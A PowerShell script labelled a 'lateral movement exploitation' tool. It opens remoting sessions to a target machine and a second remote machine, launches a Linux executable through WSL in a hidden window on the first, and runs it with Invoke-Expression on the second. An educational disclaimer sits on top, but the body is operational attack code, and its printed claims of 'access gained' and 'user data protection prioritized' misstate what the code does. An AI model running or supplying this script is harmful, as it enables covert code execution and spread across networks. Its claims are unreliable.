param (
    [string]$targetComputerName,
    [string]$remoteComputerName,
    [string]$linuxExecutablePath
)

# Lateral Movement Exploitation PowerShell Script
# This script demonstrates gaining access using Windows Subsystem for Linux (WSL) while prioritizing user data protection.
# The script exploits the WSL's integration with Windows and its ability to run Linux executables.
# Please note that exploiting vulnerabilities without proper authorization is unethical and potentially illegal.
# This script is for educational purposes and should be used responsibly in controlled environments.
# Created by milosilo

try {
    $wslExecutionCommand = "wsl $linuxExecutablePath"

    # Gaining access using WSL
    $session = New-PSSession -ComputerName $targetComputerName
    Invoke-Command -Session $session -ScriptBlock {
        param($command) Start-Process -FilePath cmd.exe -ArgumentList "/c $command" -WindowStyle Hidden
    } -ArgumentList $wslExecutionCommand
    Remove-PSSession -Session $session

    Write-Host "Access gained using Windows Subsystem for Linux (WSL)."
    Write-Host "User data protection prioritized."

    # Lateral Movement: Execute a remote command on another machine
    $session = New-PSSession -ComputerName $remoteComputerName
    Invoke-Command -Session $session -ScriptBlock {
        param($command) Invoke-Expression $command
    } -ArgumentList $wslExecutionCommand
    Remove-PSSession -Session $session

    Write-Host "Lateral movement successful using WSL."
} catch {
    Write-Host "Error: $_"
}
